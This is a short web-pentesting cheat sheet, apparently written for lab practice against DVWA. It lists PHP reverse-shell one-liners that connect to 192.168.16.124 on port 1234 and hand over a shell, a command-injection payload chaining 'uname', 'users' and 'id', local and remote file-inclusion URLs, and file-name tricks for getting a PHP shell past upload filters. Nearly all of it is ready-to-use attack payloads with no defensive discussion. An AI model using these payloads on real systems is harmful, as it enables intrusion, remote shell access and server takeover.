# WEB

PHP
===

Reverse shell one-liners:

<?php $s=fsockopen(\"192.168.16.124\",1234);exec("sh<%263>%263 2>%263");?>  
<?php $s=fsockopen("192.168.16.124",1234);exec("sh<&3>&3 2>&3") ;?>




COMMAND INJECTION
=================

* Try to use pipe, ampersands, etc. Example: `1 | uname -a & users & id`


LOCAL FILE INCLUSION
====================

Local: `http://localhost/dvwa/vulnerabilities/fi/?page=include.php`  
Remote: `http://localhost/dvwa/vulnerabilities/fi/?page=http://google.com/robots.txt`

FILE UPLOAD
===========

Image upload restrictions [bypass](http://hackers2devnull.blogspot.lt/2013/05/how-to-shell-server-via-image-upload.html):

shell.jpg.php (satisfies as check for jpg only)

shell.jpg.PhP (obfuscation)

shell.php;.jpg (sometimes can ignore whats after ";")

shell.php%0delete0.jpg (the infamous NULL byte which comments out trailing text, remove the word delete so the zeros join together, blogspot strips this string!)

shell.php.test (defaults to first recognised extension ignoring "test")

shell.php.xxxjpg (still ends in .jpg, but not recognised extension so will default to php!)

.phtml (a commonly used php parsed extension often forgotten about!)

.php3/.php4/.php5 (valid PHP extensions possibly left out of extension blacklists)
